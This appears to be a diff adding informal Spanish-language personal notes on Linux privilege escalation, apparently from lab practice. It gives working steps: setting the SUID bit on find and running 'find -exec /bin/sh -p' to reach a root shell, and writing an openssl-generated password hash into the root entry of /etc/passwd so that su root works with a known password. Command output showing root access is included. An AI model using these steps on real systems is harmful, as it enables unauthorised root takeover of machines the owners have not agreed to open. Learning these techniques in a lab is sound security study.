@@ -1,0 +1,39 @@
+
+===>> https://gtfobins.github.io/       escalada de privilegio 
+
+
+permisos suid***********
+
+::: which find | xargs ls -lah
+ -rwxr-xr-x 1 root root 304K Jan  9 07:36 /usr/bin/find
+
+::: chmod 4755 /usr/bin/find
+
+:::panda8hat@panda8hat:/home/aeo8/Desktop/burningArea/likeAtmp/testPanda8$ find . -exec /bin/sh -p \; -quit
+:::# whoami
+    root
+
+
+***************
+
+
+identificador de hash ************88
+::: openssl passwd      # genera una password men, dale proba  :)
+
+
+::: hash-identifier
+
+::: hashid hashHEREpapu  
+
+ => hash generadoConLa palabra  hola == QfyDC6DyyP/Zs       with openssl passwd
+
+root:QfyDC6DyyP/Zs:0:0:root:/root:/usr/bin/zsh   BEFORE/antes  root:x:0:0:root:/root:/usr/bin/zsh
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+de usuario sin privilegio usamos ::: su root   ingresamos con "hola"(openssl passwd) y pa dentro :)
+  por alg[un motivo solo funciona con :::su root, son sudo su o otra cuenta no funciona :u
+
+********************88
